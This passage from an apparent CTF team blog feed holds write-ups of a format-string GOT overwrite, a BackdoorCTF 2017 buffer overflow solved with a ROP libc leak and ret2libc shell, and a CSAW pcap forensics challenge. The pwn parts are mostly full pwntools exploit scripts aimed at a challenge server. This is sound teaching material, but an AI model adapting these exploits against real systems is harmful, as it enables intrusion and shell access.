<p>Usually we want to use <code>%hn</code> so we can override 2 bytes(16 bits) at each if we get greedy and try to override it as long when the binary prints the string output it will take a lot of time since it needs <code>0x0804870b</code> spaces to be printed, this is why we prefer to use %hn the address but this time we need to do it in two operations instead of one.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">0804 -&gt; <span class="string">'%11hn'</span></div><div class="line">870b -&gt; <span class="string">'%10hn'</span></div></pre></td></tr></table></figure>
<h3 id="Stack-address-offset-calculation"><a href="#Stack-address-offset-calculation" class="headerlink" title="Stack address offset calculation"></a>Stack address offset calculation</h3><p>We can do this by printing a bunch of addresses from the stack using <code>%x</code> or <code>%p</code>, we can insert some ‘AAAA’ in the beginning and the a bunch of <code>%x</code> and check on which location the ‘AAAA’ are positioned in the stack.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getConn</span><span class="params">()</span>:</span></div><div class="line">	<span class="keyword">return</span> process(<span class="string">'./32_new'</span>) <span class="keyword">if</span> local <span class="keyword">else</span> remote(<span class="string">'163.172.176.29'</span>, <span class="number">9035</span>)</div><div class="line">r =getConn()</div><div class="line">r.recvuntil(<span class="string">'Hello baby pwner, whats your name?\n'</span>)</div><div class="line">s = <span class="string">'AAAA'</span>+ <span class="string">'%x,'</span>*<span class="number">20</span></div><div class="line">r.sendline(s)</div></pre></td></tr></table></figure>
<p>We can see our <code>41414141</code> will appear in the position 10th, we now know where its located in the stack when we put some strings in the beginning: </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ python 32_new.py </div><div class="line">Ok cool, soon we will know whether you pwned it or not. Till then Bye AAAA8048914,ff92ee98,1,f745c618,36e,f7462668,ff92f144,ff92eee4,ff92eee0,41414141,252c7825,78252c78,2c78252c,252c7825,78252c78,2c78252c,252c7825,78252c78,2c78252c,252c7825,</div></pre></td></tr></table></figure>
<p>To access its position we can do like this:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="string">'%10$hn'</span></div></pre></td></tr></table></figure>
<h3 id="Override-exit-function"><a href="#Override-exit-function" class="headerlink" title="Override exit function"></a>Override exit function</h3><p>Now we need to calculate how much characters we need to add into our format expression, for example if we needed 100 we could do it like this:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="string">'%100%10$hn'</span></div></pre></td></tr></table></figure>
<p>Now starting the exploit we can easily get the exit <code>GOT</code> address with <code>pwntools</code> and the flag function we can get it from radare2 you can check it at the picture 1.2 above.</p>
<p>One nice trick is to clear the existing <code>EXIT</code> function address with <code>%10$lln</code> of course since we are adding some characters at the begining of the string the address won’t be converted to 0 in this case it actually turned into <code>0x0000004e</code>, 0x4e is 78 in decimal and that’s why I’m subtracting in the 78! And there is another thing that is very cleaver, is to split the address in half using some bit operations with this we know exactly how many characters to add (of course you still need to do some debugging in <code>gdb</code>).</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">EXIT_GOT = binary.got[<span class="string">'exit'</span>]</div><div class="line"></div><div class="line">FLAG_LOW = FLAG &amp; <span class="number">0xffff</span></div><div class="line">FLAG_HIGH = (FLAG &amp; <span class="number">0xffff0000</span>) &gt;&gt; <span class="number">16</span></div><div class="line"></div><div class="line">s = p32(EXIT_GOT)</div><div class="line">s += p32(EXIT_GOT+<span class="number">2</span>)</div><div class="line">s += <span class="string">'%10$lln'</span> <span class="comment"># clears the already existing exit address</span></div><div class="line">s += <span class="string">'%&#123;&#125;x%11$hn'</span>.format(FLAG_HIGH<span class="number">-78</span>)</div><div class="line">s += <span class="string">'%&#123;&#125;x%10$hn'</span>.format(FLAG_LOW-FLAG_HIGH)</div></pre></td></tr></table></figure>
<p>The full exploit:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">local = <span class="keyword">False</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getConn</span><span class="params">()</span>:</span></div><div class="line">	<span class="keyword">return</span> process(<span class="string">'./32_new'</span>) <span class="keyword">if</span> local <span class="keyword">else</span> remote(<span class="string">'163.172.176.29'</span>, <span class="number">9035</span>)</div><div class="line"></div><div class="line">r =getConn()</div><div class="line"><span class="comment">#gdb.attach(r, '''</span></div><div class="line"><span class="comment">#	b *0x08048724</span></div><div class="line"><span class="comment">#	c''')</span></div><div class="line">binary = ELF(<span class="string">'./32_new'</span>)</div><div class="line">FLAG = <span class="number">0x0804870b</span></div><div class="line">EXIT_GOT = binary.got[<span class="string">'exit'</span>]</div><div class="line"></div><div class="line">FLAG_LOW = FLAG &amp; <span class="number">0xffff</span></div><div class="line">FLAG_HIGH = (FLAG &amp; <span class="number">0xffff0000</span>) &gt;&gt; <span class="number">16</span></div><div class="line"></div><div class="line">s = p32(EXIT_GOT)</div><div class="line">s += p32(EXIT_GOT+<span class="number">2</span>)</div><div class="line">s += <span class="string">'%10$lln'</span> <span class="comment"># clears the already existing exit address</span></div><div class="line">s += <span class="string">'%&#123;&#125;x%11$hn'</span>.format(FLAG_HIGH<span class="number">-78</span>)</div><div class="line">s += <span class="string">'%&#123;&#125;x%10$hn'</span>.format(FLAG_LOW-FLAG_HIGH)</div><div class="line">r.recvuntil(<span class="string">'Hello baby pwner, whats your name?\n'</span>)</div><div class="line">r.sendline(s)</div><div class="line"><span class="keyword">print</span> r.recvall(timeout=<span class="number">1</span>)</div><div class="line">r.close()</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;a data-fancybox=&quot;gallery&quot; href=&quot;https://i.imgur.com/pX6qbFQ.png&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;br&gt;&lt;img src=&quot;https://i.imgur.com/pX6qbF
    
    </summary>
    
      <category term="Pwn" scheme="https://teamrocketist.github.io/categories/Pwn/"/>
    
    
      <category term="formatstring" scheme="https://teamrocketist.github.io/tags/formatstring/"/>
    
      <category term="pwn" scheme="https://teamrocketist.github.io/tags/pwn/"/>
    
      <category term="backdoorctf" scheme="https://teamrocketist.github.io/tags/backdoorctf/"/>
    
  </entry>
  
  <entry>
    <title>[Pwn] BackdoorCTF 2017 - Justdoit</title>
    <link href="https://teamrocketist.github.io/2017/09/25/Pwn-BackdoorCTF-2017-Justdoit/"/>
    <id>https://teamrocketist.github.io/2017/09/25/Pwn-BackdoorCTF-2017-Justdoit/</id>
    <published>2017-09-25T01:57:29.000Z</published>
    <updated>2017-09-25T04:54:39.302Z</updated>
    
    <content type="html"><![CDATA[<p><a data-fancybox="gallery" href="https://i.imgur.com/zgcdKZK.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/zgcdKZK.png" alt=""><br></a></p>
<p><em>1.1 - representation of the assembly code of the binary</em></p>
<p>So we have 32 bit binary and a buffer overflow vulnerability, lets use <a href="https://github.com/slimm609/checksec.sh" target="_blank" rel="external">checksec</a> to see its protections:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">Arch:     i386-32-little</div><div class="line">RELRO:    Partial RELRO</div><div class="line">Stack:    No canary found</div><div class="line">NX:       NX enabled</div><div class="line">PIE:      No PIE (0x8048000)</div></pre></td></tr></table></figure>
<p>There isn’t a stack canary protection but we have <code>NX ENABLED</code> so we can’t execute code in the stack we have to use Return Oriented Programming(ROP) to leak libc addresses and finally return to libc… We can check which functions are available for us using objdump:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">$ objdump -R justdoit </div><div class="line"></div><div class="line">justdoit:     file format elf32-i386</div><div class="line"></div><div class="line">DYNAMIC RELOCATION RECORDS</div><div class="line">OFFSET   TYPE              VALUE </div><div class="line">08049ffc R_386_GLOB_DAT    __gmon_start__</div><div class="line">0804a00c R_386_JUMP_SLOT   <span class="built_in">read</span>@GLIBC_2.0</div><div class="line">0804a010 R_386_JUMP_SLOT   <span class="built_in">printf</span>@GLIBC_2.0</div><div class="line">0804a014 R_386_JUMP_SLOT   __gmon_start__</div><div class="line">0804a018 R_386_JUMP_SLOT   __libc_start_main@GLIBC_2.0</div><div class="line">0804a01c R_386_JUMP_SLOT   write@GLIBC_2.0</div></pre></td></tr></table></figure>
<p>We have <code>write</code> which is everything we need to do this challenge, using write we can leak addresses from the Global Offset Table (GOT) with the leaks we can calculate the offsets using the lib.so that was provided by the challenge.</p>
<p>Here is the plan to exploit it:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">1 - Overflow the buffer</div><div class="line">2 - Using ROP to leak GOT addresses with write function and return to main</div><div class="line">3 - Overflow the buffer again and jump to system with /bin/sh as argument</div></pre></td></tr></table></figure>
<h3 id="Overflow-the-buffer"><a href="#Overflow-the-buffer" class="headerlink" title="Overflow the buffer"></a>Overflow the buffer</h3><p>According to the assembly code at picture 1.1 the read function will read up to 200 bytes so lets use <code>metasploit</code> to create a 200 byte pattern:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 200</div><div class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag</div></pre></td></tr></table></figure>
<p>Now lets see on each address it will break using <code>gdb</code> : </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">pwndbg&gt; r</div><div class="line">Starting program: /home/evilgod/Documents/Hacking/ctf/backdoor/pwn/justdoit/justdoit </div><div class="line">Hello pwners, </div><div class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag</div><div class="line"></div><div class="line">Program received signal SIGSEGV, Segmentation fault.</div><div class="line">Program received signal SIGSEGV (fault address 0x64413764)</div></pre></td></tr></table></figure>
<p>As we can see we have a page fault error at the address <code>0x64413764</code> so once again lets use <code>metasploit</code> to calculate the offset:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x64413764</div><div class="line">[*] Exact match at offset 112</div></pre></td></tr></table></figure>
<h3 id="ROP-and-leak-libc-addresses"><a href="#ROP-and-leak-libc-addresses" class="headerlink" title="ROP and leak libc addresses"></a>ROP and leak libc addresses</h3><p><code>write</code> needs 3 arguments as follows:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">ssize_t</span> write(<span class="keyword">int</span> fildes, <span class="keyword">const</span> <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> nbytes);</div></pre></td></tr></table></figure>
<p>We can use <code>pwntools</code> to get the GOT and PLT addresses from the binary (note that you can use <code>objdump</code> too to achieve the same result). Memorize this if you are beginner in binary exploitation and don’t understand really well what GOT is, just remember if you want to jump and execute a function from <code>libc</code> you jump into <code>PLT</code> but if you want to leak an address from libc you get the value from the <code>GOT</code> address.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">binary = ELF(<span class="string">'./justdoit'</span>)</div><div class="line">libc = ELF(<span class="string">'libc.so.6'</span>)</div><div class="line">padding = <span class="string">'A'</span>*<span class="number">112</span></div><div class="line">WRITEPLT = binary.plt[<span class="string">'write'</span>]</div><div class="line">PRINTFGOT = binary.got[<span class="string">'printf'</span>]</div><div class="line">MAIN = <span class="number">0x804847d</span> <span class="comment"># You can get this from radare2 for example</span></div></pre></td></tr></table></figure>
<p>Since the binary is 32 bits we don’t really need to <code>pop</code> stack address into specific registers like in 64 bit a simple <code>ropchain</code> to leak <code>printf</code> address can be built like this:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">ropchain = <span class="string">''</span></div><div class="line">ropchain += p32(WRITEPLT) <span class="comment"># WRITE function "call"</span></div><div class="line">ropchain += p32(MAIN) <span class="comment"># RETURN TO MAIN</span></div><div class="line">ropchain += p32(<span class="number">0x1</span>) <span class="comment"># STDIN ARG[0]</span></div><div class="line">ropchain += p32(PRINTFGOT) <span class="comment"># PRINTF ADDRESS ARG[1]</span></div><div class="line">ropchain += p32(<span class="number">0x4</span>) <span class="comment"># BYTES TO READ ARG[2]</span></div></pre></td></tr></table></figure>
<p>After we send this to the server, we can calculate everything with <code>symbols</code> from <code>pwntools</code> : </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">r = getConn()</div><div class="line"></div><div class="line">r.recvline()</div><div class="line">r.sendline(padding+ropchain)</div><div class="line">r.recv(len(padding)+len(ropchain)) <span class="comment"># reads the printf output</span></div><div class="line"></div><div class="line">PRINTF = u32(r.recv(<span class="number">0x4</span>)) <span class="comment"># leaked printf address</span></div><div class="line">LIBCBASE = PRINTF - libc.symbols[<span class="string">'printf'</span>]</div><div class="line">SYSTEM = LIBCBASE + libc.symbols[<span class="string">'system'</span>]</div><div class="line">BINSH = LIBCBASE + <span class="number">0x15900b</span></div><div class="line"></div><div class="line">log.info(<span class="string">"LIBC 0x%x"</span> % LIBCBASE)</div><div class="line">log.info(<span class="string">"PRINTF 0x%x"</span> % PRINTF)</div><div class="line">log.info(<span class="string">"SYSTEM 0x%x"</span> % SYSTEM)</div><div class="line">log.info(<span class="string">"Binsh 0x%x"</span> % BINSH)</div></pre></td></tr></table></figure>
<p>If you are wondering where I got the offset of <code>/bin/sh</code> string , you can use a nice trick with strings command:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ strings -a -t x libc.so.6 | grep <span class="string">'/bin/sh'</span></div><div class="line"> 15900b /bin/sh</div></pre></td></tr></table></figure>
<h3 id="Overflow-again-and-jump-to-libc"><a href="#Overflow-again-and-jump-to-libc" class="headerlink" title="Overflow again and jump to libc"></a>Overflow again and jump to libc</h3><p>Now that we have <code>system</code> and <code>/bin/sh</code> string we can just jump into them! note that I had to readjust the padding offset (use gdb to check the values on the <code>stack</code> to calculate the offset):</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">ropchain2 = p32(SYSTEM) <span class="comment"># WRITE function "call"</span></div><div class="line">ropchain2 += <span class="string">'BBBB'</span> <span class="comment"># Return address doesn't really matter to where we return after shell</span></div><div class="line">ropchain2 += p32(BINSH)</div><div class="line"></div><div class="line">r.recvuntil(<span class="string">'Hello pwners, \n'</span>)</div><div class="line">r.sendline(<span class="string">'A'</span>*(<span class="number">112</span><span class="number">-8</span>)+ropchain2)</div><div class="line">r.recv()</div><div class="line">r.interactive()</div><div class="line">r.close()</div></pre></td></tr></table></figure>
<p>And now the full script:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line"></div><div class="line">local = <span class="keyword">True</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getConn</span><span class="params">()</span>:</span></div><div class="line">	<span class="keyword">return</span> process(<span class="string">'./justdoit'</span>, env = &#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">'./libc.so.6'</span>&#125;) <span class="keyword">if</span> local <span class="keyword">else</span> remote(<span class="string">'163.172.176.29'</span>, <span class="number">9036</span>)</div><div class="line"></div><div class="line">padding = <span class="string">'A'</span>*<span class="number">112</span></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">binary = ELF(<span class="string">'./justdoit'</span>)</div><div class="line">libc = ELF(<span class="string">'libc.so.6'</span>)</div><div class="line"></div><div class="line">WRITEPLT = binary.plt[<span class="string">'write'</span>]</div><div class="line">PRINTFGOT = binary.got[<span class="string">'printf'</span>]</div><div class="line">MAIN = <span class="number">0x804847d</span> <span class="comment"># You can get this from radare2 for example</span></div><div class="line"></div><div class="line">ropchain = <span class="string">''</span></div><div class="line">ropchain += p32(WRITEPLT) <span class="comment"># PRINTF function "call"</span></div><div class="line">ropchain += p32(MAIN) <span class="comment"># RETURN TO MAIN</span></div><div class="line">ropchain += p32(<span class="number">0x1</span>) <span class="comment"># STDIN ARG[0]</span></div><div class="line">ropchain += p32(PRINTFGOT) <span class="comment"># PRINTF ADDRESS ARG[1]</span></div><div class="line">ropchain += p32(<span class="number">0x4</span>) <span class="comment"># BYTES TO READ ARG[2]</span></div><div class="line"></div><div class="line">r = getConn()</div><div class="line"></div><div class="line"><span class="comment">#gdb.attach(r, '''</span></div><div class="line"><span class="comment">#	b *0x080484d8</span></div><div class="line"><span class="comment">#	c''')</span></div><div class="line"></div><div class="line">r.recvline()</div><div class="line">r.sendline(padding+ropchain)</div><div class="line">r.recv(len(padding)+len(ropchain)) <span class="comment"># reads the printf output</span></div><div class="line"></div><div class="line">PRINTF = u32(r.recv(<span class="number">0x4</span>))</div><div class="line">LIBCBASE = PRINTF - libc.symbols[<span class="string">'printf'</span>]</div><div class="line">SYSTEM = LIBCBASE + libc.symbols[<span class="string">'system'</span>]</div><div class="line">BINSH = LIBCBASE + <span class="number">0x15900b</span></div><div class="line"></div><div class="line">log.info(<span class="string">"LIBC 0x%x"</span> % LIBCBASE)</div><div class="line">log.info(<span class="string">"PRINTF 0x%x"</span> % PRINTF)</div><div class="line">log.info(<span class="string">"SYSTEM 0x%x"</span> % SYSTEM)</div><div class="line">log.info(<span class="string">"Binsh 0x%x"</span> % BINSH)</div><div class="line"></div><div class="line">ropchain2 = p32(SYSTEM) <span class="comment"># WRITE function "call"</span></div><div class="line">ropchain2 += <span class="string">'BBBB'</span> <span class="comment"># Return address doesn't really matter to where we return after shell</span></div><div class="line">ropchain2 += p32(BINSH)</div><div class="line"></div><div class="line">r.recvuntil(<span class="string">'Hello pwners, \n'</span>)</div><div class="line">r.sendline(<span class="string">'A'</span>*(<span class="number">112</span><span class="number">-8</span>)+ropchain2)</div><div class="line">r.recv()</div><div class="line">r.interactive()</div><div class="line">r.close()</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;a data-fancybox=&quot;gallery&quot; href=&quot;https://i.imgur.com/zgcdKZK.png&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;br&gt;&lt;img src=&quot;https://i.imgur.com/zgcdKZ
    
    </summary>
    
      <category term="Pwn" scheme="https://teamrocketist.github.io/categories/Pwn/"/>
    
    
      <category term="pwn" scheme="https://teamrocketist.github.io/tags/pwn/"/>
    
      <category term="bufferOverflow" scheme="https://teamrocketist.github.io/tags/bufferOverflow/"/>
    
      <category term="ROP" scheme="https://teamrocketist.github.io/tags/ROP/"/>
    
      <category term="retToLibc" scheme="https://teamrocketist.github.io/tags/retToLibc/"/>
    
      <category term="backdoorctf" scheme="https://teamrocketist.github.io/tags/backdoorctf/"/>
    
  </entry>
  
  <entry>
    <title>[Forensics] CSAW - Missed Registration</title>
    <link href="https://teamrocketist.github.io/2017/09/19/Forensics-CSAW-Missed-Registration/"/>
    <id>https://teamrocketist.github.io/2017/09/19/Forensics-CSAW-Missed-Registration/</id>
    <published>2017-09-19T09:34:16.000Z</published>
    <updated>2017-09-19T10:49:04.383Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br>Missed Registration<br><br>It’s registration day! These forms just seem longer and longer…<br><br>UPDATE 10:44 Eastern: New pcap that should be a bit easier to work with.<br><br>UPDATE 2:58 Eastern: We’re regenerating due to flag leaks, submissions disabled until then. Please be patient.<br><br>Update 3:31 Eastern: Updated pcap with new flag after leak. Please re-run your solutions on the file!<br><br><a href="https://ctf.csaw.io/files/bd2d3bcfdf09f06728d81d1a0cc0e4ff/cap.pcap" target="_blank" rel="external">https://ctf.csaw.io/files/bd2d3bcfdf09f06728d81d1a0cc0e4ff/cap.pcap</a><br></blockquote>

<p>We have a pcap file, at first we saw alot of <code>HTTP POST</code> requests:</p>
<p><a data-fancybox="gallery" href="https://i.imgur.com/O2U2weX.png" target="_blank" rel="external"><img src="https://i.imgur.com/O2U2weX.png" alt=""></a></p>
<p>A lot of the form fields were filled with crap information in latin, at first we thought the parameter n was encrypted or some other kind of binary we extracted but we found nothing. After awhile instead of looking at HTTP form URL encoded tab from writeshark we started looking at TCP segment data and we found a new post param, a “x” parameter that only showed up in some of the requests:<br><a data-fancybox="gallery" href="https://i.imgur.com/jEzYqZz.png" target="_blank" rel="external"><img src="https://i.imgur.com/jEzYqZz.png" alt=""></a></p>
<p>The very first HTTP POST requests has this value:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&amp;x=424d923500000000000036040000280000004301000027000000010008000000000000000000c40e0000c40e00000001000000010000000001ff0c0e10ff0d1012ff131719ff161d21ff1b2226ff1c2b33ff1f313bff24292bff252c31ff2a3338ff33393bff243742ff283741ff</div></pre></td></tr></table></figure>
<p>the beginning of this value “424d” indicated us that this might be an bmp image file! so we extracted all x’s values in one line bash command!:</p>
<figure class="highlight zsh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tshark -r cap.pcap -Y <span class="string">"http &amp;&amp; tcp.payload contains \"&amp;x=\""</span> -Tfields -e tcp.segment_data | tr -d <span class="string">':|\n'</span> | xxd -r -p | tr -d <span class="string">'x='</span> | xxd -r -p &gt; img.bmp</div></pre></td></tr></table></figure>
<p><a data-fancybox="gallery" href="https://i.imgur.com/Kr6Kxhh.png" target="_blank" rel="external"><img src="https://i.imgur.com/Kr6Kxhh.png" alt=""></a></p>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;br&gt;Missed Registration&lt;br&gt;&lt;br&gt;It’s registration day! These forms just seem longer and longer…&lt;br&gt;&lt;br&gt;UPDATE 10:44 Eastern: New 
    
    </summary>
    
      <category term="Forensics" scheme="https://teamrocketist.github.io/categories/Forensics/"/>
    
    
      <category term="csaw" scheme="https://teamrocketist.github.io/tags/csaw/"/>
    
      <category term="forensics" scheme="https://teamrocketist.github.io/tags/forensics/"/>
    
      <category term="pcap" scheme="https://teamrocketist.github.io/tags/pcap/"/>
    
      <category term="bmp" scheme="https://teamrocketist.github.io/tags/bmp/"/>
    
  </entry>
  
</feed>
